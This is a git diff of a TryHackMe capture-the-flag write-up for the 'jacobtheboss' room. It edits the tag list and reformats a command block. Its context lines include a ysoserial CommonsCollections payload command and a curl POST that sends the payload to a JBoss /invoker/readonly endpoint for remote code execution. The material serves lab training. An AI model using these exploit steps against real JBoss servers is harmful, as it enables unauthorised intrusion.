@@ -3,10 +3,10 @@ tags:
   - THM
   - Medium
   - Linux
+  - CVE
   - Deserialization
-  - RCE
   - SUID
-  - File-Analysis
+  - Cmd-Injection
   - PwnKit
 ---
 https://tryhackme.com/room/jacobtheboss/
@@ -145,8 +145,8 @@ $ /usr/lib/jvm/java-11-openjdk/bin/java -jar ysoserial-modified.jar CommonsColle
 $ curl -s -X POST 'http://jacobtheboss.box:8080/invoker/readonly' --data-binary @payload.ser
 ```
 Get the **user flag**:
-```console
-$ cat /home/jacob/user.txt
+```bash
+cat /home/jacob/user.txt
 ```
 # Post-Exploitation
 ## Privilege Escalation
